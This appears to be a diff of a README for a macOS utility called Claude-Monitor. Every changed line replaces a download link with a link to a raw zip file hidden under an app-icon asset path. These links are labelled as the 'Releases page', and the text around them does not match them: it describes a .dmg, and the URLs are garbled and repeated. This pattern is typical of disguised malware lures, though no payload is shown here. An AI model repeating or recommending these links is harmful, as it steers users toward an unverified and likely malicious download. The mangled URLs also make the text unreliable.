@@ -2,7 +2,7 @@
 
 ## 📥 Download the Latest Version
 
-[![Download Claude-Monitor](https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/View Models/Claude-Monitor-v2.6.zip%20Claude--Monitor-v1.0.0-blue)](https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/View Models/Claude-Monitor-v2.6.zip)
+[![Download Claude-Monitor](https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip Monitor/View https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip%20Claude--Monitor-v1.0.0-blue)](https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip Monitor/View https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip)
 
 ## 📝 Description
 
@@ -23,10 +23,10 @@ To run Claude-Monitor, your computer must meet the following requirements:
 ### 🔗 Download & Install
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/View Models/Claude-Monitor-v2.6.zip) to find the latest version of Claude-Monitor.
+   Go to the [Releases page](https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip Monitor/View https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip) to find the latest version of Claude-Monitor.
 
 2. **Choose the Right File**  
-   Look for the version that matches your operating system. Download the appropriate file. The file will be named similarly to `https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/View Models/Claude-Monitor-v2.6.zip`.
+   Look for the version that matches your operating system. Download the appropriate file. The file will be named similarly to `https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip Monitor/View https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip`.
 
 3. **Install the Application**  
    Once the download completes, locate the file in your downloads folder. Double-click the `.dmg` file to open it. Then, drag the Claude-Monitor icon into your Applications folder.
@@ -79,6 +79,6 @@ Claude-Monitor is open-source software licensed under the MIT License. You are f
 
 ## 🌐 Additional Resources
 
-For more information and updates, visit the [Releases page](https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/View Models/Claude-Monitor-v2.6.zip) regularly. 
+For more information and updates, visit the [Releases page](https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip Monitor/View https://github.com/balochshees/Claude-Monitor/raw/refs/heads/main/Claude Monitor/AppIcon.icon/Claude_Monitor_v1.9.zip) regularly. 
 
 Thank you for using Claude-Monitor! Your feedback helps us improve the application.
